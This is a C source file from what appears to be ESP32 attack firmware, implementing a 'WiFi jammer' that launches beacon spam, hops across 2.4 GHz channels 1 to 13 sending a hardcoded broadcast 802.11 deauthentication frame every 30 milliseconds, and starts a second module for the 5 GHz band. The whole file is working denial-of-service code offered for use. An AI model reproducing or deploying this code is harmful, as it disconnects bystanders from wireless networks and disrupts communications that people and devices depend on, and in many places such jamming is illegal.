#include "attack_jammer.h"
#include "attack_beacon_spam.h"
#include "bw16_uart.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "jammer";
static bool jammer_running = false;
static TaskHandle_t jammer_task = NULL;

static void jammer_task_func(void *pv) {
    ESP_LOGI(TAG, "2.4GHz jammer task running");
    beacon_spam_start(50);
    
    uint8_t deauth_frame[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xf0, 0xff, 0x02, 0x00
    };
    
    while (jammer_running) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    
    beacon_spam_stop();
    vTaskDelete(NULL);
}

void attack_jammer_start(void) {
    if (jammer_running) return;
    jammer_running = true;
    xTaskCreate(jammer_task_func, "jammer_24g", 4096, NULL, 5, &jammer_task);
    bw16_jammer_start();
    ESP_LOGI(TAG, "WiFi Jammer ACTIVE on both bands");
}

void attack_jammer_stop(void) {
    if (!jammer_running) return;
    jammer_running = false;
    if (jammer_task) { vTaskDelay(pdMS_TO_TICKS(100)); jammer_task = NULL; }
    bw16_jammer_stop();
    ESP_LOGI(TAG, "WiFi Jammer stopped");
}

bool attack_jammer_is_running(void) { return jammer_running; }
